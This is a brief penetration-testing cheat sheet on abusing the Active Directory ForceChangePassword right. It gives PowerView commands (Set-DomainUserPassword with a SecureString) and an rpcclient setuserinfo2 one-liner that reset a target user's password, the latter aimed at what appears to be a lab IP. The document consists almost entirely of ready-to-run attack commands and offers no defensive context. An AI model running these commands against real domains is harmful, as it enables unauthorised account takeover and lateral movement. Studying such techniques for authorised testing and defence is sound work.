---
title: "ForceChangePassword"
date: 2024-7-18
tags: ["ForceChangePassword", "active driectory", "ad", "Windows"]
---

---
### Using PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### Change Target User Password

```powershell
$pass = ConvertTo-SecureString 'password' -AsPlainText -Force 
```

```powershell
Set-DomainUserPassword -Identity <target_user> -AccountPassword $pass
```

### Using rpcclient

```bash
rpcclient -U 'domain/username%password' 10.10.11.10 -c 'setuserinfo2 target_user 23 "password"'
```

<br>